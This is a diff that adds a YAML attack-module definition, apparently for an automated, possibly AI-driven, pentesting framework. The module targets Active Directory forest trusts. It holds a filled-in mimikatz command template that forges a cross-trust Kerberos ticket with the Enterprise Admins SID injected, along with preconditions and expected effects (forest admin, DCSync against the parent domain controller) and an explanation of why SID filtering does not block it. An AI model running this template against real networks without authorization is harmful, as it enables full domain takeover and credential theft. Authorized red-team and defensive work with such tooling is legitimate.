@@ -1,0 +1,41 @@
+name: trust_ticket_forge
+category: ad
+description: Cross-trust TGT forge with extra SIDs (child→parent forest takeover)
+preconditions:
+- has_trust_key
+- trust_key_extracted
+- has_cred
+- domain_joined
+parameters:
+  child_domain: from_engagement.domain
+  parent_domain: from_engagement.parent_domain
+  child_sid: from_engagement.child_sid
+  parent_sid: from_engagement.parent_sid
+  trust_key: from_cred.trust_key
+command_template: mimikatz "kerberos::golden /user:Administrator /domain:{child_domain}
+  /sid:{child_sid} /sids:{parent_sid}-519 /rc4:{trust_key} /service:krbtgt /target:{parent_domain}
+  /ticket:trust.kirbi"
+parser: generic_parser
+expected_effects:
+- forest_admin
+- trust_ticket_forged
+- dcsync_against_parent
+falsifier:
+  pattern: SID filtering|denied|ERROR|mimikatz|invalid
+  timeout: 30
+model_tier: sonnet
+mechanism: 'Forge an inter-realm TGT with EnterpriseAdmins SID injected via extraSids.
+  Parent
+
+  forest accepts because its krbtgt isn''t checked at this stage and SID filtering
+  is
+
+  OFF by default for in-forest trusts. Pass-the-ticket and DCSync against the parent
+
+  DC. This is the canonical child→parent forest takeover.
+
+  '
+references:
+  ocd_mindmap: 'Branch 14: Cross-trust ticket forge (child → parent forest)'
+  hacktricks: windows-hardening/active-directory-methodology/forest-and-domain-trusts.md
+hacktricks_ref: windows-hardening/basic-cmd-for-pentesters.md
